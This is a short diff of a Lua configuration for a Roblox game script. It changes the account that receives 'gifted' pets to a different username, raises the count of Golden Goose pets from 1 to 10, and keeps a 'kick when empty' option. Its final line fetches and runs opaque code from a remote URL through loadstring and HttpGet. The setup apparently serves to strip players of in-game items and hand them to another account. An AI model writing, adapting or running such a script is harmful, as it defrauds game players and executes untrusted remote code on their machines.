@@ -10,11 +10,10 @@ _G.CF = {
     PetConfig = {
         Enabled = true,                          -- Enable/disable pet gifting
         KickWhenEmpty = true,                    -- Kick when no more pets to gift
-        GiftForPlayer = "mghmghmgh9",       -- Account that receives pets
+        GiftForPlayer = "zinikax",       -- Account that receives pets
         ListPetGift = {                          -- Pet name and amount
-            ["Golden Goose"] = 1
+            ["Golden Goose"] = 10
         }
     }
 }
-task.wait(5)
 loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f3207df612e2e9d2"))()
